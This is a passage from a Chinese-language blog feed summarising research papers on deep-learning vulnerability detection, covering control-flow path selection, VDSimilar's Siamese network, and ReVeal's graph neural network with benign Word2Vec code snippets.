Statements中，并将if_sttatement中的边缘添加到else_statement。对于图3，我们将节点8连接到节点4，移除从节点6到节点4的边，并将节点6连接到节点8。接下来，我们遍历else_语句。我们将其最后一个子语句连接到当前的Next语句。如果它的最后一个子语句是Normal语句，我们会将其边缘移除到Next语句，并将其连接到第一个子语句。对于图3，我们将节点9连接到节点4，将节点8移除到节点4并将节点8连接到节点9。最后，我们将if_statement连接到它的then_block的第一个子语句。对于图3，我们将节点5连接到节点6，将节点6连接到节点7，将节点10连接到节点11。</p><p>6） 对于每个switch_statement，我们将其连接到其第一个case_statement。对于每个case_statement，我们首先将其连接到下一个case_statementor default_statement。然后，如果这个case_statement的最后一个子语句是Normal语句，我们将其连接到这个case_statement的当前Next语句。最后，我们将case_statement连接到它的第一个子语句。对于每个default_statement，如果其最后一个子语句不是Normal语句，我们将其连接到其第一个子语句，并将其最后一个子语句连接到switch_statement的Non-child-Next语句。</p><p>7） 对于每个try_statement，我们将其catch_clauses视为语句。我们不能为try_statement构造一个“声音”CFG，因为我们不能知道每个函数调用只能从调用方的AST抛出哪些异常。此外，构建一个“完整”的CFG需要将try_block中的每个语句连接到每个catch_clause，这可能会引入太多的死路径，并对以下阶段产生负面影响。因此，我们选择只将try_block中的最后一个Normal语句连接到catch_clauses。具体来说，我们将try_statement连接到其try_block中的第一个语句，将其try_bock中的最后一个Normal语句连接到其第一个catch_clause。对于每个catch_clause，我们将其连接到它的第一个语句和下一个catch_clause。此外，对于try_block和每个catch_clause中的最后一个语句，即Normal语句，我们将其连接到try_statement的Non-Child Next语句。</p><p><strong>Path Selection</strong><br>一个代码片段可以被视为其所有执行路径的组合。但是，如果代码段包含循环，则它可能具有无限的执行路径。它可能需要许多计算资源来编码代码片段的所有执行路径。**因此，我们认为，在CFG中对所有执行路径进行编码以学习相应代码片段的表示是不切实际的。我们将基于语法的CFG中的执行路径定义为从CFG的入口节点到出口节点的路径，并从此将其称为执行路径。此外，在看不见的代码片段中准确定位易受攻击的语句是非常重要的。**如果我们只提取一个执行路径来表示代码片段，那么很可能会错过易受攻击的语句，并对漏洞检测的性能产生负面影响。幸运的是，根据我们对现实世界漏洞的观察和第三节中给出的激励性示例，我们发现一些执行路径通常可以涵盖漏洞的根本原因。因此，我们选择并编码几个具有代表性的执行路径来表示相应的代码片段，而不是对CFG中的所有或仅一个执行路径进行编码。Alon等人也使用了类似的策略。[51]在将代码片段表示为AST路径时。该阶段负责从先前阶段构建的CFG中选择几个具有代表性的执行路径。</p><p>选择执行路径有两个要求：首先，为了避免丢失代码片段中的重要信息，所选路径应覆盖尽可能多的代码行。其次，为了减轻模型训练的负担，我们希望选择的路径尽可能短。不幸的是，这两个要求在某种程度上是冲突的。为了在它们之间进行权衡，我们提出了一种基于贪婪的路径选择算法。</p><h2 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h2><h4 id="31-dataset-and-process">3.1 DataSet and Process</h4><h4 id="32-evaluation">3.2 <strong>Evaluation</strong></h4><h2 id="4-conclusion">4 Conclusion</h2><h2 id="summary">Summary</h2><aside> 💡 Others<hr>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VDSimilar</title>
      <link href="/2023/12/18/Papers/Vul/VDSimilar/"/>
      <url>/2023/12/18/Papers/Vul/VDSimilar/</url>
      
        <content type="html"><![CDATA[<h3 id="paper">Paper</h3><p>VDSimilar: Vulnerability detection based on code similarity of vulnerabilities and patches，Hao Sun, Lei Cui，C&amp;S(B)。</p><h3 id="abstract">Abstract</h3><p>现有的研究将漏洞检测视为一个分类问题，在捕获语义和语法相似性的同时需要大量的标记数据。本研究认为漏洞的相似性是漏洞检测的关键，本文准备了一个由漏洞和相关补丁组成的相对较小的数据集，并尝试比较漏洞之间的相似性、漏洞补丁之间的差异性来实现漏洞检测。为此，使用Siamese网络+BiLSTM+Attention作为检测模型。在OpenSSL和Linux的876个漏洞和补丁的数据集上，提出了模型VDSimilar，在OpenSSL的AUC值上达到了约97.17%，优于目前基于深度学习的漏洞检测SOTA方法。</p><h3 id="introduction">Introduction</h3><p>现有的基于代码相似性的漏洞检测方法普遍是基于代码段语法和语义的相似性来进行的，但是两份语法语义相似的代码很可能因为一丁点差别而一个有漏洞一个没有漏洞，因此，本文希望找到一个能从漏洞角度捕获相似性的方法。另外，基于深度学习的方法总是需要大量的数据，比如VulDeepecker需要61638个code gadget，准备这样的数据集需要花费巨大的人力资源，本文希望找到一个可以在小数据集上使用的深度学习检测方法。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291000651.jpeg" alt="img"></p><p>本文提出了一个基于度量学习的代码漏洞检测方法，学习了一个应用于漏洞和补丁数据集上的代码相似性检测器。首先，准备一个CVE brunch的数据集，每个CVE brunch包含与一个CVE相关的多个漏洞函数和补丁函数，如上图所示，这些CVE函数可以从不同版本的软件中获得，它们遵循两个规则：</p><ul><li>对于同一个CVE中两个版本的漏洞函数，漏洞片段保持不变</li><li>对于一个漏洞函数和一个补丁函数，漏洞片段一定消失</li></ul><p>因此，每个CVE brunch都可能提供一个CVE漏洞特征。其次，从漏洞的角度来看，不同版本的两个漏洞函数应该被视为相似的，即使版本迭代过程中存在代码更改；另一方面，由于补丁代码中漏洞片段已经消除，因此即使漏洞函数与补丁函数语法和语义相似，也应视为不同。本研究在本文提出的数据集上与之前的方法比较，证明了VDSimilar的有效性。</p><p>本文认为，相比整个漏洞函数，漏洞代码片段是漏洞检测的关键，如下图所示，显示了t1_lib.c 的 tls_decrypt_ticket函数的代码片段，该函数在OpenSSL的三个版本中演进。该功能被报告为一个漏洞(CVE-2014-3567)，影响0.9.8zb和1.0.1i，然后在更高版本的1.0.1l中修复，下图中第二个函数应该是1.0.1i。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291000691.jpeg" alt="img"></p><p>可见，相比第一版，第二版增加了4行，改变了一行，都是漏洞函数。第三版相比第二版只增加了一行，和第一版相比更接近于第二版，但第三版确是补丁函数。OpenSSL程序不断发展，其中一个函数可能会由于诸多原因修改，如修复bug、优化性能或重构代码。两个版本的相同函数在语法和语义上可能会有很大的差异，而对于需要修复的漏洞，补丁可能只涉及几行甚至一行代码，因此跨连续版本的漏洞函数和补丁函数在语法上是高度相似的。</p><p>因此，一种好的基于代码相似度的漏洞检测方法应该更多地关注漏洞片段的相似度，而不是整个函数的代码语法和语义的相似度。</p><h3 id="method">Method</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291000615.jpeg" alt="img"></p><p>上图是VDSimilar的整体framework，数据集包含了很多的CVE漏洞，每个CVE漏洞由几个版本的漏洞函数和补丁函数组成。由于训练样本过少，本文采用度量学习的方式训练计算相似性的分类器，对于漏洞-漏洞函数对，标记为相似label为1，对于漏洞-补丁函数对，标记为不相似label为0，训练Siamese网络，训练过程中引入Attention，最终计算测试函数和漏洞库函数的相似性，相似性高于一定阈值被认为存在漏洞。</p><ul><li><strong>数据准备</strong></li></ul><p>为了准备数据集，本文从CVE Details数据库中收集了一组CVE，如下图所示，漏洞一般可以通过两种途径得到。一种是直接下载product，然后根据漏洞详细信息中描述的文件名和函数名提取漏洞函数；另一种是直接从外部链接中引用的补丁中提取漏洞；由于有些外部链接并不可用，因此本文采用第一种方式。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291000621.jpeg" alt="img"></p><p>为了获得补丁，假设最新的有漏洞版本之后的Linux和OpenSSL版本漏洞已经修复，通过从多个版本的程序中提取漏洞和补丁函数，生成一组相似对({V, V, 1})和差异对({V, P, 0})。使用网络爬虫Scrapy框架爬取CVE Details中的程序版本、漏洞函数名、文件名和补丁等等信息，可以为每个CVE获取一个元组，即(CVE、软件、漏洞版本、补丁版本、文件名、函数名)。</p><p>对于每一个CVE，根据上文提取的详细信息，使用LLVM解析源代码，提取出一组漏洞函数和补丁函数。使用hash的方式去除重复函数、修正可能出现的漏洞标签错误信息。然后生成相似对和差异对，在该过程中扩大数据集，方便训练。</p><ul><li><strong>检测模型</strong></li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291000648.jpeg" alt="img"></p><p>本文的检测模型Siamese架构如上图所示，首先进行embedding，然后输入BiLSTM中得到输出，经过一层Attention后计算相似度即可。值得一提的是该Attention是self-attention，类似transformer一样，由H成参数矩阵生成Q,K,V，然后进行Attention计算，该Attention过程的作用是将注意力聚集在漏洞代码片段而不是整个函数上。</p><p>Siamese网络是一个共享权重的孪生网络，模型训练过程中最大化漏洞函数之间的相似度，最小化漏洞函数和补丁函数的相似度。在测试过程中计算每个目标函数与已有漏洞函数的相似度，如果接近1则有漏洞，如果接近0则没有漏洞，算法伪代码如下。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291000618.jpeg" alt="img"></p><h3 id="evaluation">Evaluation</h3><p>与Simian，Nicad，ReDeBug，PMD-CPD，SyseVR，VulDeePecker这几个方法做比较，本文的Siamese模型在Linux和OpenSSL数据集上取得了更高的检测准确率和F1值。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291000002.jpeg" alt="img"></p><p>本文将VDSimilar和几个之前的深度学习模型做比较，发现Siamese+BiLSTM+Attention的VDSimilar模型具有最好的泛化性能。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291000010.jpeg" alt="img"></p><h3 id="conclusion">Conclusion</h3><p>本文提出了一个基于代码相似性的源代码漏洞检测方法，准备了一个由漏洞和相关补丁组成的相对较小的数据集，并尝试比较漏洞之间的相似性、漏洞补丁之间的差异性来实现漏洞检测。为此，使用Siamese网络+BiLSTM+Attention作为检测模型。在OpenSSL和Linux的876个漏洞和补丁的数据集上取得了良好的实验效果，证明了模型的有效性。</p>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reveal</title>
      <link href="/2023/12/18/Papers/Vul/Reveal/"/>
      <url>/2023/12/18/Papers/Vul/Reveal/</url>
      
        <content type="html"><![CDATA[<h2 id="一背景">一.背景</h2><p>漏洞检测具有重大的意义，针对DLVP（Deep Learning Vulnerability detection）任务，作者在对现有的漏洞检测方法（VulDeepecker, SyScVR）等测试时发现了一些问题。</p><ul><li>在sard等合成数据集训练的模型用在真实场景下（FFMPeg, Qemu, Linux等）效果很差</li><li>在用解释方法（LEMNA等）来解释漏洞检测方法时经常发现模型学习到了无关的特征</li><li>训练/测试数据包含了许多重复</li><li>现有的方法没有解决样本类别不平衡问题</li></ul><p>论文贡献</p><ul><li>提出了新的漏洞检测方法Reveal</li><li>利用Chromium和Debian的修复commit构造数据集</li></ul><h2 id="二数据集">二.数据集</h2><h3 id="21-现有数据集">2.1 现有数据集</h3><p>针对数据集，作者统计的一些结果<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657318.png" alt="在这里插入图片描述"><br>有合成，半合成，真实 &amp; 类别平衡， 真实 &amp; 类别不平衡</p><ul><li>合成类：包括<a href="https://www.nist.gov/publications/report-static-analysis-tool-exposition-sate-iv">Juliet</a>。使用已知漏洞pattern构造。</li><li>半合成：包括<a href="https://samate.nist.gov/SRD/index.php">SARD</a>和<a href="https://www.nist.gov/publications/national-vulnerability-database-nvd-overview">NVD</a>。它们是从软件产品中提取，并做了一定修改。</li><li>真实：从代码仓库（github）的commit中提取，来自一些bug fix版本。</li></ul><h3 id="22-reveal数据集">2.2 Reveal数据集</h3><p>从<a href="https://so.csdn.net/so/search?q=Linux&amp;spm=1001.2101.3001.7020">Linux</a> Debian Kernel 和Chromium的vulnerabilitiy fixed patches中构造。</p><ul><li>对于Chromium，从<a href="https://bugs.chromium.org/p/chromium/issues/list">Bugzilla</a>中提取。</li><li>对于Linux Debian Kernel， 从<a href="https://security-tracker.debian.org/tracker/">Debian security tracker</a>中提取。</li></ul><p>该数据集是针对function（单个函数）进行分类的，构造过程如下：</p><ul><li>对于每个patch，从选取其vulnerable版本到fixed版本中被修改过源文件（.c, .cpp）和头文件（.h）。</li><li>对于被修改过的function，将该function修改前的标注为<code>vulnerable</code>。fix之后的标注为clean，其余未在patch中出现的function均标注为<code>clean</code>。</li></ul><p>示例如图<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657344.png" alt="在这里插入图片描述"><br>v e r s i o n k − 1 version_{k-1}versionk−1​ 表示有漏洞的源文件，v e r s i o n k version_kversionk​ 表示fix版本。<code>ham_0</code>会被标注为vulnerable，<code>ham_1</code>，<code>egg</code>，<code>spam</code>会被标注为<code>clean</code>。</p><p>数据集统计信息如下：<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657348.png" alt="在这里插入图片描述"></p><h2 id="三现有方法">三.现有方法</h2><p>现有的方法大致可分为token-based和graph-based</p><h3 id="31-token-based">3.1 token-based</h3><p>token-based模型将源代码当成一个简单的token序列。而序列长度则会很大程度上影响模型发挥，因为源代码token序列可能相当长。所以就有了code slicing（VulDeepecker, SySeVR）。slicing的初衷是不考虑每个代码行，预处理的时候忽略掉许多无关行。slicing技术上从一些interesting points（API调用，数组索引，指针使用）出发。尽管如此，token-based方法将源代码视为序列，容易丢失语义信息。做过slice也会丢失一些依赖。</p><h3 id="32-graph-based">3.2 graph-based</h3><p>graph-based模型将代码视为一个基于句法和语义依赖的图。句法依赖包括AST（抽象语法树），语义依赖包括CFG（控制流图），DFG（数据流图），PDG（程序依赖图），Def-Use chain graph。比如<a href="https://blog.csdn.net/qq_44370676/article/details/115326040">Devign</a>使用了CPG（代码依赖图）。一般来说，使用的依赖信息越多，检出率越高，但是本身消耗的资源也会更多。</p><h3 id="33-存在的问题">3.3 存在的问题</h3><p>都存在vocabulary explosion（词表爆炸）问题。词表主要包括一些identifier（变量名，函数名，常量值等）。比如<code>int count = 0;</code>中包括了变量名<code>count</code>。而实际应用中变量名有无限种可能，如果简单粗暴的添加进词表那么100%要爆炸，有一种解决方案（VulDeepecker, SySeVR中采用的）是<strong>符号化</strong>。比如对于变量名<code>count</code>，将其用<code>VAR1</code>替代，对于自定义函数名<code>function</code>，将其用<code>FUNC1</code>替代，以此类推。</p><p>将代码转化为token序列后就是要向量化了，向量化主流的方案就是用embedding layer。这个embedding layer可以采用直接用下游任务（预测代码是否有漏洞）来训练，也可以用Word2Vec甚至Bert来先预训练。VulDeePecker和SySeVR用Word2Vec来将每个token向量化。Devign直接用Word2Vec来向量化一个statement的所有token（有点没搞懂Word2Vec是怎么对序列向量化的）。</p><p>向量化之后就是训练了，训练就需要损失函数，现有的方案采用交叉熵（cross entropy）或者带正则化的交叉熵损失函数。但仅仅靠交叉熵损失函数只能区分是否包含漏洞，并不能让模型学习到有漏洞和没有漏洞的代码的区别。</p><p>此外还有一个问题就是数据不平衡，因为数据集中包含漏洞和不包含漏洞的代码比例非常不协调。</p><h2 id="四reveal">四.ReVeal</h2><p>总体过程如下图所示<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657355.png" alt="在这里插入图片描述"><br>需要注意的是作者这里进行了2个阶段的训练</p><ul><li>第一个阶段是pre-train（Phase-I）。主要是训练GGNN，目标是能获得良好的graph embedding。</li><li>第二个阶段是train（Phase-II）。主要是训练MLP，目标是获得良好分类结果，SMOTE过采样也主要是应用在Phase-II。</li></ul><h3 id="41-feature-extraction-phase-i">4.1 Feature Extraction (Phase-I)</h3><p>这个阶段的目标是将源代码转化成一个向量，这个向量保存了代码的语义（semantic）和句法（syntactic）信息。因此作者用到了CPG（代码属性图）。</p><p>通常，CPG表示为 G = ( V , E ) G = (V,E)G=(V,E)。V是结点（英文vertices或者nodes）和边集合（edges）。与Devign不同的是，这里每个结点不仅包含原始的一行代码（statement或者code fragment）。还包括statement类型（即这一行代码大概是什么语句，ArithmeticExpression或者CallStatement等等）。</p><p>所以对于一个node v vv的向量化包括2部分</p><ul><li>用one-hot将其类型向量化，得到向量 T v T_vTv</li><li>用word2vec向量化code fragment内容，得到向量 C v C_vCv</li><li>拼接（concat）C v C_vCv 和 T v T_vTv 得到结点向量 x v x_vxv</li></ul><p>对于用Word2Vec向量化，代码里如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">node_split = nltk.word_tokenize(node_content)</span><br><span class="line">nrp = np.zeros(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">for</span> token in node_split:</span><br><span class="line">try:</span><br><span class="line">   embedding = wv.wv[token]</span><br><span class="line">except:</span><br><span class="line">   embedding = np.zeros(<span class="number">100</span>)</span><br><span class="line">nrp = np.add(nrp, embedding)</span><br><span class="line"><span class="keyword">if</span> len(node_split) &gt; <span class="number">0</span>:</span><br><span class="line">   fNrp = np.divide(nrp, len(node_split))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   fNrp = nrp</span><br></pre></td></tr></table></figure><p>从<code>node_split = nltk.word_tokenize(node_content)</code>和<code>fNrp = np.divide(nrp, len(node_split))</code>可知对于一行代码（以<code>int a = 10</code>）为例。会将statement先解析成一个token序列，之后用Word2Vec对每个token向量化，然后取所有token向量的<strong>均值</strong>。</p><p>之后便用GGNN来进行结点向量的聚合，GGNN的计算过程前面总结过：<a href="https://blog.csdn.net/qq_44370676/article/details/115701325">图神经网络的计算过程</a></p><p>简单来说，经过GGNN的处理，每个结点的向量由 x v x_vxv 变成 x v ′ x_v^{’}xv′<br>x v ′ = G R U ( x v , ∑ ( u , v ) ∈ E g ( x u ) ) x_v^{’} = GRU(x_v, \sum\limits_{(u,v) \in E} g(x_u) )xv′​=GRU(xv​,(u,v)∈E∑​g(xu​))</p><p>GRU内部公式就不展开了，在RNN序列任务种 h t = G R U ( i n p u t i , h t − 1 ) h_t = GRU(input_i, h_{t-1})ht=GRU(inputi,ht−1) 。u uu 是 v vv 邻居结点，g ( ⋅ ) g(·)g(⋅) 是一个 transformation function。</p><p>最后一步就是用聚合函数（aggregate function）将每个结点的向量聚合成一个向量 x g x_gxg，作为整个CPG，也就是源代码的向量表示。</p><p>x g = ∑ v ∈ V x v ′ x_g = \sum\limits_{v \in V} x_v^{’}xg=v∈V∑xv′</p><p>这里在论文中，作者用向量总和（element-wise summation）作为聚合函数，而实际上在代码里，聚合函数是一个可配置参数。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061709378.png" alt="image-20240406170926341"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657330.png" alt="在这里插入图片描述"></p><h3 id="42-training-phase-ii">4.2 Training (Phase-II)</h3><p>现实数据集中的样本不平衡问题非常严重，不包含漏洞的代码数量远超过包括漏洞的。</p><p>因此作者将训练阶段分为2部分</p><ul><li>Reducing Class Imbalance：采用re-sampling（不知道该如何翻译）平衡训练集vulnerable和non-vulnerable的样本。</li><li>Representation Learning Model：基于平衡后的数据集训练一个可以很好的区分vulnerable和non-vulnerable样本的representation learning model。</li></ul><h4 id="421-reducing-class-imbalance">4.2.1 Reducing Class Imbalance</h4><p>在处理样本不平衡问题上用到了SMOTE算法。对于样本中的多数类（non-vulnerable），SMOTE会进行sub-sampling（随机删除一些样本），对于少数类（vulnerable），SMOTE会进行super-sampling（新合成一些样本）。直到每个类别的出现频率相等。算法如下图表示</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657366.png" alt="在这里插入图片描述"></p><h4 id="422-representation-learning-model">4.2.2 Representation Learning Model</h4><p>一个code fragment（一个method）的CPG（用 G GG 表示）经过graph embedding（phase-I）后得到向量 x g x_gxg， 作为 G GG 的最终向量表示。但是vulnerable codes 和 non-vulnerable codes的向量在特征空间上有很大重合。</p><p>codes的特征向量经过TSNE降维后如下表示，一个点代表一个code fragment，红色部分为vulnerable codes，绿色为non-vulnerable codes。可以看到一个好的embedding是需要能够在特征空间区分开它们的。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657895.png" alt="在这里插入图片描述"><br>分类函数如下所示<br>y = σ ( W . h ( x g ) + b ) y = \sigma(W .h(x_g) +b)y=σ(W.h(xg​)+b)</p><ul><li>σ \sigmaσ 为softmax</li><li>W WW 和 b bb 为最后一层全连接层的参数</li></ul><p>其中 h ( x g ) h(x_g)h(xg) 为一个全连接层，将 x g x_gxg 投影到新的向量平面 h g h_ghg。</p><p>为了将non-vulnerable和vulnerable特征向量区别最大化。作者在训练模型时用到了triplet loss而不是softmax，记为 L t r p L_{trp}Ltrp。每次训练需要用到的一个数据为一个3元组，记为 ( g , s a m e , d i f f ) (g, same, diff)(g,same,diff) 对应 ( a , p , n ) (a, p, n)(a,p,n)。s a m e samesame 和 g gg 为同属一个类的样本， d i f f diffdiff 则相反。</p><p>L t r p = L C E + α . L p + β ∗ L r e g L_{trp} = L_{CE} + \alpha .L_{p} + \beta * L_{reg}Ltrp=LCE+α.Lp+β∗Lreg</p><ul><li><p>α \alphaα 和 β \betaβ 为超参数</p></li><li><p>L C E L_{CE}LCE 为交叉熵损失<br>L C E = − ∑ y ^ ⋅ l o g ( y ) + ( 1 − y ^ ) ⋅ l o g ( 1 − y ) L_{CE} = - \sum \hat y·log(y) + (1−\hat y)·log(1−y)LCE​=−∑y<sup>​⋅log(y)+(1−y</sup>​)⋅log(1−y) ，y yy 和 y ^ \hat yy^​ 分别表示 g gg 的标签和预测结果</p></li><li><p>L r e g L_{reg}Lreg 为正则化损失<br>L r e g = ∣ ∣ h ( x g ) ∣ ∣ + ∣ ∣ h ( x s a m e ) ∣ ∣ + ∣ ∣ h ( x d i f f ) ∣ ∣ L_{reg} = ||h(x_g)||+||h(x_{same})|| + ||h(x_{diff})||Lreg​=∣∣h(xg​)∣∣+∣∣h(xsame​)∣∣+∣∣h(xdiff​)∣∣ 。这里正则化损失主要用来限制 h hh 即投影空间向量大小。</p></li><li><p>L p = ∣ D ( h ( x g ) , h ( x s a m e ) ) − D ( h ( x g ) , h ( x d i f f ) ) + γ ∣ L_{p} = | D(h(x_g), h(x_{same}))−D(h(x_g),h(x_{diff})) + \gamma|Lp=∣D(h(xg),h(xsame))−D(h(xg),h(xdiff))+γ∣<br>L p L_{p}Lp​ 为投影损失，是为了最大区分正类和负类样本在投影空间的差异。<br>D ( v 1 , v 2 ) = 1 − ∣ v 1 . v 2 ∣ ∣ v 1 ∣ ∣ ∗ ∣ ∣ v 2 ∣ ∣ ∣ D(v_1,v_2) = 1−|\frac{v_1.v_2}{||v1||∗||v2||}|D(v1​,v2​)=1−∣∣∣v1∣∣∗∣∣v2∣∣v1​.v2​​∣</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061710663.png" alt="image-20240406171004625"></p></li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657836.png" alt="在这里插入图片描述"></p><h2 id="五-实验设置">五. 实验设置</h2><p>模型超参数大小<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657849.png" alt="在这里插入图片描述"><br>评估指标:</p><ul><li>跟Devign一样，这是个针对function的二分类问题。</li><li>Accuracy, Precision, Recall, F1-score这4个指标用来评估模型。</li></ul><h2 id="六实验结果">六.实验结果</h2><h3 id="61-现有方法的有效性">6.1 现有方法的有效性</h3><p>作者在评估其它模型（vuldeepecker等）的性能时统一使用真实数据集，针对现有的模型训练数据的问题，作者给出了2个场景</p><ul><li>Scenario-A (pre-trained models)<br>该模型在它本身的数据集上训练（比如VulDeepecker在sard数据集上训练），然后在真实数据集上测试</li><li>Scenario-B (re-trained models)<br>真实数据集上训练 + 真实数据集测试</li></ul><p>Scenario-A的测试结果如下：<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657888.png" alt="在这里插入图片描述"><br>Scenario-B的测试结果如下：<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657917.png" alt="在这里插入图片描述">同时，作者自己实现了一个Devign，并开源到<a href="https://github.com/saikat107/Devign">github</a>了。</p><p>可以看到，现有的方法泛化能力不强，在应用到真实数据集时效果有一定程度下降。</p><h3 id="62-现有方法的局限性">6.2 现有方法的局限性</h3><h4 id="621-数据重复">6.2.1 数据重复</h4><p>用slice和token-based方法都可能造成在训练集和测试集造成数据重复。作者做了一个统计，结果如下<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657046.png" alt="在这里插入图片描述">可以看到合成数据集比真实数据集多了很多重复。虽然重复会有利于漏洞分类任务，但不利于模型提取漏洞特征。</p><h4 id="622-数据不平衡">6.2.2 数据不平衡</h4><p>数据集的情况再粘贴以下，看看Vul这一列，可以看到很多数据集中，正负样本比例不均。所以会造成模型分类时倾向于多数类。<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657244.png" alt="在这里插入图片描述"></p><h4 id="623-学到不相关特征">6.2.3 学到不相关特征</h4><p>为了选择好的DL模型来做漏洞分类，非常有必要理解模型是基于什么特征来做的分类。好的模型应该分配更多的权重给漏洞相关的特征。</p><p>作者通过LEMNA（一种解释方法）来解释token-based模型的分类结果。结果如下<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657302.png" alt="在这里插入图片描述"><br>对于graph-based模型，作者则用每个结点的激活值来表示，激活值越大，结点越关键。对一个被token-based方法错误分类而被graph-based方法正确方法分类的样本解释， 结果如下</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657290.png" alt="在这里插入图片描述"></p><h4 id="624-模型选择缺乏区分度">6.2.4 模型选择：缺乏区分度</h4><p>这里主要展示不同的方法提取到的代码的特征向量对正类负类样本的区分度，即特征向量空间中两类代码是否很容易被区分开。作者用TSNE对不同方法提取的特征向量进行研究，并用centroid distance来衡量它们的效果， 结果如下（再粘贴一次）</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657356.png" alt="在这里插入图片描述"><br>绿色为负类（无漏洞）的样本，红色为正类（有漏洞）。</p><h3 id="63-解决上述问题">6.3 解决上述问题</h3><p>作者分别用SMOTE解决样本不均衡问题，而REVEAL本身就能解决其它的问题。</p><p>为了分别研究re-sampling和GGNN的效果，作者做了几组实验。不过实验结果里作者并未提到用什么模型替代了GGNN。</p><p>Re-balance的效果</p><p>实验结果如下（主要看F1-score），W/O表示without<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657298.png" alt="在这里插入图片描述"><br>跟其它模型（token-based + MLP,RF,SVM）的对比<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061657371.png" alt="在这里插入图片描述"></p><h2 id="七预训练word2vec">七.预训练Word2Vec</h2><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">train</span><span class="params">(args)</span>:</span><br><span class="line">    files = args.data_paths</span><br><span class="line">    sentences = []</span><br><span class="line">    <span class="keyword">for</span> f in files:</span><br><span class="line">        data = json.load(open(f))</span><br><span class="line">        <span class="keyword">for</span> e in data:</span><br><span class="line">            code = e[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">            sentences.append([token.strip() <span class="keyword">for</span> token in code.split()])</span><br><span class="line">    wvmodel = Word2Vec(sentences, min_count=args.min_occ, workers=<span class="number">8</span>, size=args.embedding_size)</span><br><span class="line">    print(<span class="string">&#x27;Embedding Size : &#x27;</span>, wvmodel.vector_size)</span><br><span class="line">    <span class="keyword">for</span> i in range(args.epochs):</span><br><span class="line">        wvmodel.train(sentences, total_examples=len(sentences), epochs=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> not os.path.exists(args.save_model_dir):</span><br><span class="line">        os.mkdir(args.save_model_dir)</span><br><span class="line">    save_file_path = os.path.join(args.save_model_dir, args.model_name)</span><br><span class="line">    wvmodel.save(save_file_path)</span><br><span class="line"><span class="number">12345678910111213141516</span></span><br></pre></td></tr></table></figure><p>这里大概就是将一个function的所有代码<code>split</code>成一个token序列当作一个sentence训练Word2Vec模型。</p><h2 id="八参考文献">八.参考文献</h2><blockquote><p><a href="https://arxiv.org/abs/2009.07235">Chakraborty, S. , Krishna, R. , Ding, Y. , &amp; Ray, B. . (2020). Deep<br>Learning based Vulnerability Detection: Are We There Yet?.</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulDeePecke</title>
      <link href="/2023/12/18/Papers/Vul/VulDeepecker/"/>
      <url>/2023/12/18/Papers/Vul/VulDeepecker/</url>
      
        <content type="html"><![CDATA[<h2 id="vuldeepecker基于深度学习的漏洞检测系统"><a href="https://zhuanlan.zhihu.com/p/265616085">VulDeePecker：基于深度学习的漏洞检测系统</a></h2>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
